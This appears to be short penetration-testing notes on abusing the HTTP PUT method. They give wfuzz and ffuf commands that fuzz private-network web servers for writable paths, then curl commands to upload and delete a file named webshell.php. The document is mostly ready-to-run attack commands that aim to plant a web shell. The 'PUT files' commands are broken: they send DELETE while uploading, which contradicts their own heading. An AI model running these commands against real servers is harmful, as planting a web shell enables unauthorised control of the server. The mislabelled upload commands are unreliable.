Fuzzing for PUT method:
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X PUT -u <http://192.168.1.47/FUZZ> --sc 201 -L
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X PUT -u <http://192.168.1.50/FUZZ> --hc 404,501 -L

Fuzzing http methods:
wfuzz -z file,methods.txt -z file,dirs.txt -X FUZZ -u <http://192.168.1.47/FUZ2Z> -L

Fuzzing for PUT method: (ffuf is a lot faster as it's written in go. In contrast to wfuzz which is written in python)   (ffuf by default doesn't show 201 responses, but we definitely wanna see that if we're fuzzing for PUT methods)
ffuf -u <http://192.168.1.50/FUZZ> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -X PUT -mc 200,201,204,301,302,307,401,403,405,500 -r
ffuf -u <http://192.168.1.50/FUZZ> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -X PUT -mc 200,201,204,301,302,307,401,403,405,500 -r 


PUT files:
curl -X DELETE -T webshell.php <http://192.168.1.50/test/> -v --http1.0
curl -X DELETE -T webshell.php <http://192.168.1.50/test/> -v

DELETE files:
curl -X DELETE <http://192.168.1.50/test/webshell.php> -v --http1.0
curl -X DELETE <http://192.168.1.50/test/webshell.php> -v

